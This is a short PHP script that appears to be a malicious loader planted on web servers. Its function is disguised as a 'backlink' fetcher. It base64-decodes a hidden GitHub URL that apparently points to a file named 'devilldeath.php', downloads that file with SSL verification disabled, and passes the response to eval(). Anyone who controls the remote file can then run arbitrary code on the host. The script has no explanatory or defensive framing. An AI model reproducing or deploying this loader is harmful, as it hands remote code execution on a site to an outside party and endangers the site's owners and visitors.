<?php

function getBacklink($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } else if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

$encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nlb2JhZGJveXMvbWVudGFoYW4vcmVmcy9oZWFkcy9tYWluL2RldmlsbGxkZWF0aC5waHA==";
$url = base64_decode($encodedUrl);

$content = getBacklink($url);

if ($content !== false) {
    eval("?>" . $content);
} else {
    echo "juice";
}

?>
